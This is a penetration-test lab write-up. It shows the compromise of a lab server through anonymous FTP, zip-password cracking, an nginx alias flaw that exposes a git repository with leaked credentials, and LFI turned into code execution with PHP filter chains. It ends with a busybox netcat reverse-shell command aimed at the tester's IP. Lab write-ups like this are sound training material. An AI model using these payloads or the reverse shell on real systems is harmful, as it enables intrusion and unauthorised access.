# Lab description
You’ve been brought in to conduct an internal penetration test targeting a highly sensitive Linux server. To demonstrate the real-world business impact of a breach, the client has hidden two flags on the system. Your objective: compromise the server and extract both flags.

The client has provided you with VPN access to their environment, but no other information.

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.0.20.19 -vv

Nmap scan report for 10.0.20.19
Host is up, received user-set (0.096s latency).
Scanned at 2026-10-08 18:05:45 BST for 65s
Not shown: 65486 filtered tcp ports (no-response)
PORT      STATE  SERVICE REASON
21/tcp    open   ftp     syn-ack
22/tcp    open   ssh     syn-ack
80/tcp    open   http    syn-ack
```

## Nmap
```python
❯❯❯ nmap -p 21,22,80 -A --min-rate=2000 -sT -Pn 10.0.20.19
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 18:10 +0100
Nmap scan report for traverse.hsm (10.0.20.19)
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Sep 22 07:49 devops
|_-rw-rw-r--    1 ftp      ftp       3507597 Jun 20  2022 mountains-wallpaper-photo.jpg
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 36:47:04:4c:08:64:cf:fa:8f:e5:f2:18:6b:d1:c1:06 (ECDSA)
|_  256 8a:5d:e3:13:e6:f8:6d:d5:31:5a:90:ef:22:13:14:ab (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Traverse Outdoor Equipment
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (86%), Linux 2.6.32 - 3.13 (86%), Linux 3.2 - 4.14 (86%), Linux 4.15 - 5.19 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (86%), Linux 2.6.32 - 3.10 (85%), Linux 4.15 (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# SSH (22)
## Version info
```python
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 36:47:04:4c:08:64:cf:fa:8f:e5:f2:18:6b:d1:c1:06 (ECDSA)
|_  256 8a:5d:e3:13:e6:f8:6d:d5:31:5a:90:ef:22:13:14:ab (ED25519)
```

## Auth method
```python
❯❯❯ ssh root@traverse.hsm
The authenticity of host 'traverse.hsm (10.0.20.19)' can't be established.
ED25519 key fingerprint is: SHA256:489rvDc5Uk/oTQm9cDzL+Q0f72XioVYVvKpJAvGyDP8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'traverse.hsm' (ED25519) to the list of known hosts.
root@traverse.hsm: Permission denied (publickey).
```

Key based auth, more secure

# FTP (21)

As seen from nmap, anonymous login is enabled

```python
❯❯❯ ftp traverse.hsm                                              
Connected to traverse.hsm.
220 (vsFTPd 3.0.5)
Name (traverse.hsm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30022|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22 07:49 devops
-rw-rw-r--    1 ftp      ftp       3507597 Jun 20  2022 mountains-wallpaper-photo.jpg
226 Directory send OK.
ftp> 
```

```python
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||30030|)
550 Permission denied.
ftp> 
```

I cannot write to it

```python
ftp> binary
200 Switching to Binary mode.
ftp> mget *
mget devops [anpqy?]? y
229 Entering Extended Passive Mode (|||30086|)
550 Failed to open file.
mget mountains-wallpaper-photo.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||30005|)
150 Opening BINARY mode data connection for mountains-wallpaper-photo.jpg (3507597 bytes).
100% |*****************************************************************|  3425 KiB    4.10 MiB/s    00:00 ETA
226 Transfer complete.
3507597 bytes received in 00:00 (3.67 MiB/s)
ftp> 
```

Ill download the full contents in binary mode to avoid things like file corruption

The image has nothing visible on it, nor nothing in the metadata

```python
ftp> get content.zip
local: content.zip remote: content.zip
229 Entering Extended Passive Mode (|||30100|)
150 Opening BINARY mode data connection for content.zip (829 bytes).
100% |*****************************************************************|   829        1.47 MiB/s    00:00 ETA
226 Transfer complete.
829 bytes received in 00:00 (8.44 KiB/s)
ftp> 
```

There is also a zip file here ill download

```python
❯❯❯ unzip content.zip 
Archive:  content.zip
[content.zip] message.eml password: 
```

It requires a password to unzip

```python
❯❯❯ zip2john content.zip > zip.hash 

❯❯❯ hashcat zip.hash /usr/share/wordlists/rockyou.txt --user -m 17220

$pkzip$2*1*1*0*8*24*8c80*ed201a0ee956594825e6b82d805328024fbb3032742ad247e65fd829dadf9153a1d9d38a*2*0*de*116*243d0d6e*0*45*8*de*3e2b*378566d3d8a1d23aa37518e6b8471fe5637db20a636a69a92c49e03b899e85cac1797f9fe60e3de6d4b88d5e2762ec56a6843fac795952d44501b619c5215b41493a93a8285e86da522d67d27fa40cbf5804515d002197d40841bc927e0a5c7f215075ea956848be895bfde79fcc038f0e3133094ba7a73a50e9cb52b5d46ef58b923afd9612f295f84c43ae665ca36f29323064eb1e5e167d4c797e14407b42d09722cc53799be71c131d2d7e1ca1b447b83f743a26c31734175ed2a862377c6dadc5a46e5b0b1d48e36f5a48bb10defac338139a0d0e59d7ab0b96e5be*$/pkzip$:mountaineers
```

The hash cracked so i should be able to unzip it

```python
❯❯❯ unzip content.zip 
Archive:  content.zip
[content.zip] message.eml password: 
  inflating: message.eml             
  inflating: traverse.conf
```

Now i can look at these files

```python
❯❯❯ cat message.eml 
From: spencer@traverse.hsm
To: devops@traverse.hsm
Subject: Repository status
Date: Mon, 13 Apr 2026 17:30:00 +0000
Content-Type: text/plain; charset="UTF-8"

The repository in /opt/app has been initialized.

--
Spencer Tomkins
Senior DevOps Engineer
Traverse Outdoor Equipment
```

A reference to a repo? 

Also two possible users found

```python
❯❯❯ cat traverse.conf 
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    return 301 http://traverse.hsm$request_uri;
}

server {
    listen 80;
    listen [::]:80;
    server_name traverse.hsm;

    root /var/www/html;
    index index.html;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /assets {
        alias /opt/app/static/;
    }
}
```

Nothing too interesting here

# HTTP (80)

![1016](Pasted%20image%2020261008182819.png)

## Nuclei
```python
❯❯❯ nuclei -u http://traverse.hsm/ 

[git-config-nginxoffbyslash] [http] [medium] http://traverse.hsm//assets../.git/config [paths="/assets../.git/config"]

...[SNIP]...
```

![](Pasted%20image%2020261008194729.png)

This clearly shows the git repo from earlier

# Enumeration of git repo

https://github.com/arthaud/git-dumper

I can use this tool to download all the file from this repo

```python
❯❯❯ git-dumper http://traverse.hsm//assets../.git/ git-dump 
```

This has downloaded some files, some were found to be 404 but some returned 200s

```python
❯❯❯ git log --all --oneline                                          
d708e3e (HEAD -> master) Document web deployment workflow
cff44e1 Move environment credentials to deployment
539a855 Initialize Traverse web repository
```

There is three commits, the second one looks the most interesting

```python
git show cff44e1
commit cff44e123f6eca9a71e4c0cc98b13f9df64caad2
Author: Spencer Tomkins <spencer@traverse.hsm>
Date:   Mon Apr 13 18:06:00 2026 +0000

    Move environment credentials to deployment

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..3b9d9f1
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1,5 @@
+*.env
+.env
+.DS_Store
+deploy/environments/*.env
+!deploy/environments/*.env.example
diff --git a/deploy/environments/docs-development.env b/deploy/environments/docs-development.env.example
similarity index 64%
rename from deploy/environments/docs-development.env
rename to deploy/environments/docs-development.env.example
index 3e53430..ab131a5 100644
--- a/deploy/environments/docs-development.env
+++ b/deploy/environments/docs-development.env.example
@@ -1,5 +1,5 @@
 DOCS_ENV=development
 DOCS_BASE_URL=http://docs-0eoyfsyajxs.traverse.hsm
-DOCS_USERNAME=spencer
-DOCS_PASSWORD=RidgeLine!2026
+DOCS_USERNAME=
+DOCS_PASSWORD=
 DOCS_RENDERER=legacy
```

Found some credentials and a subdomain, these creds wont work on SSH becuase SSH does not allow password based auth

# `docs-0eoyfsyajxs.traverse.hsm` subdomain

![901](Pasted%20image%2020261008195851.png)

Found a login form

The credentials may work here

![716](Pasted%20image%2020261008200115.png)

The credentials do get me access

![](Pasted%20image%2020261008200622.png)

The pages use an interesting URL parameter, looks like it could be vulnerable to some form of path traversal

![](Pasted%20image%2020261008203547.png)

Ill continue to test path traversal, i see its not blocking `../` through a blacklist

It doesnt looks like i can escape the `pages/` directory by normal means

![](Pasted%20image%2020261008204212.png)

However it does look like i can use PHP filters

# LFI to RCE

https://github.com/synacktiv/php_filter_chain_generator

```python
❯❯❯ python3 php_filter_chain_generator.py --chain '<?=system($_GET[0]);?>'
```

This will inject the `0` as a parameter

Ill then use this in the URL inside the `?page=` parameter i can then use `&0=` to get code execution

![](Pasted%20image%2020261008212800.png)

# Reverse shell

```python
❯❯❯ penelope -p 1337         
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.105.173
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Ill start the listener

![](Pasted%20image%2020261008212946.png)

The system has netcat as well as busybox

![](Pasted%20image%2020261008213934.png)

```python
busybox nc 10.200.105.173 1337 -e /bin/bash
```

Ill place this inside 0 using the same phh filter value, then apply some URL encoding



